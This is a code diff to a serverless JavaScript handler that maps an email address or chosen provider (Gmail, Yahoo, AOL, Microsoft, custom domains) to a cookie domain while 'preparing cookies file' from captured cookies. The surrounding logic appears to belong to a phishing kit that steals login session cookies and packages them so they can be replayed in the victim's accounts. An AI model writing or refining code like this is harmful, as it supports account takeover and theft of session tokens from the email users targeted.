@@ -237,18 +237,111 @@ export const handler = async (event, context) => {
     try {
       console.log('📎 Preparing cookies file...');
       
-      // Determine domain based on provider
-      let defaultDomain = '.login.microsoftonline.com';
+      // Enhanced domain detection function
+      const getDomainFromEmail = (email, provider) => {
+        console.log(`🔍 Domain detection - Email: ${email}, Provider: ${provider}`);
+        
+        // PRIORITY 1: Extract domain from email address (most reliable)
+        if (email && email.includes('@')) {
+          const emailDomain = email.split('@')[1].toLowerCase();
+          console.log(`📧 Extracted email domain: ${emailDomain}`);
+          
+          // Map common email domains to their OAuth domains
+          const domainMapping = {
+            'gmail.com': '.google.com',
+            'googlemail.com': '.google.com',
+            'yahoo.com': '.yahoo.com',
+            'yahoo.co.uk': '.yahoo.com',
+            'yahoo.ca': '.yahoo.com',
+            'yahoo.fr': '.yahoo.com',
+            'yahoo.de': '.yahoo.com',
+            'ymail.com': '.yahoo.com',
+            'rocketmail.com': '.yahoo.com',
+            'aol.com': '.aol.com',
+            'aim.com': '.aol.com',
+            'hotmail.com': '.live.com',
+            'hotmail.co.uk': '.live.com',
+            'hotmail.fr': '.live.com',
+            'hotmail.de': '.live.com',
+            'live.com': '.live.com',
+            'live.co.uk': '.live.com',
+            'live.fr': '.live.com',
+            'live.de': '.live.com',
+            'msn.com': '.live.com',
+            'outlook.com': '.live.com',
+            'outlook.co.uk': '.live.com',
+            'outlook.fr': '.live.com',
+            'outlook.de': '.live.com'
+          };
+          
+          // Check if we have a specific mapping for this domain
+          if (domainMapping[emailDomain]) {
+            console.log(`✅ Found domain mapping: ${emailDomain} → ${domainMapping[emailDomain]}`);
+            return domainMapping[emailDomain];
+          }
+          
+          // For business/custom domains, check if it's a known business domain
+          // If it's a custom domain, use the actual domain
+          if (!emailDomain.includes('gmail') && !emailDomain.includes('yahoo') && 
+              !emailDomain.includes('hotmail') && !emailDomain.includes('outlook') && 
+              !emailDomain.includes('live') && !emailDomain.includes('aol')) {
+            console.log(`🏢 Using business domain: .${emailDomain}`);
+            return '.' + emailDomain;
+          }
+        }
+        
+        // PRIORITY 2: Provider-based detection (fallback)
+        const providerLower = (provider || '').toLowerCase();
+        console.log(`🏷️ Provider-based detection: ${providerLower}`);
+        
+        if (providerLower.includes('gmail') || providerLower.includes('google')) {
+          console.log(`✅ Provider detected as Google`);
+          return '.google.com';
+        } else if (providerLower.includes('yahoo')) {
+          console.log(`✅ Provider detected as Yahoo`);
+          return '.yahoo.com';
+        } else if (providerLower.includes('aol')) {
+          console.log(`✅ Provider detected as AOL`);
+          return '.aol.com';
+        } else if (providerLower.includes('hotmail') || providerLower.includes('live') || 
+                   providerLower.includes('outlook') || providerLower.includes('office365')) {
+          console.log(`✅ Provider detected as Microsoft`);
+          return '.live.com';
+        }
+        
+        // PRIORITY 3: If provider is "Others", try to detect from email again
+        if (providerLower === 'others' && email && email.includes('@')) {
+          const emailDomain = email.split('@')[1].toLowerCase();
+          console.log(`🔄 Provider is 'Others', re-checking email domain: ${emailDomain}`);
+          
+          // Direct email domain analysis for common providers
+          if (emailDomain.includes('gmail') || emailDomain.includes('googlemail')) {
+            console.log(`✅ Email domain detected as Google`);
+            return '.google.com';
+          } else if (emailDomain.includes('yahoo') || emailDomain.includes('ymail') || emailDomain.includes('rocketmail')) {
+            console.log(`✅ Email domain detected as Yahoo`);
+            return '.yahoo.com';
+          } else if (emailDomain.includes('hotmail') || emailDomain.includes('live') || 
+                     emailDomain.includes('outlook') || emailDomain.includes('msn')) {
+            console.log(`✅ Email domain detected as Microsoft`);
+            return '.live.com';
+          } else if (emailDomain.includes('aol') || emailDomain.includes('aim')) {
+            console.log(`✅ Email domain detected as AOL`);
+            return '.aol.com';
+          } else {
+            // For unknown domains when provider is "Others", use the actual domain
+            console.log(`🏢 Unknown domain with 'Others' provider, using: .${emailDomain}`);
+            return '.' + emailDomain;
+          }
+        }
+        
+        // FINAL FALLBACK: Only use Microsoft domain if we really can't determine anything
+        console.log(`⚠️ Using final fallback domain: .login.microsoftonline.com`);
+        return '.login.microsoftonline.com';
+      };
       
-      if (provider === 'Gmail' || provider === 'Google') {
-        defaultDomain = '.google.com';
-      } else if (provider === 'Yahoo') {
-        defaultDomain = '.yahoo.com';
-      } else if (provider === 'AOL') {
-        defaultDomain = '.aol.com';
-      } else if (provider === 'Office365' || provider === 'Outlook') {
-        defaultDomain = '.login.microsoftonline.com';
-      }
+      const defaultDomain = getDomainFromEmail(email, provider);
+      console.log(`🌐 FINAL DETECTED DOMAIN: ${defaultDomain} for email: ${email} and provider: ${provider}`);
       
       // Ensure cookies have the proper format
       const cookiesForFile = formattedCookies.length > 0 ? formattedCookies.map(cookie => ({
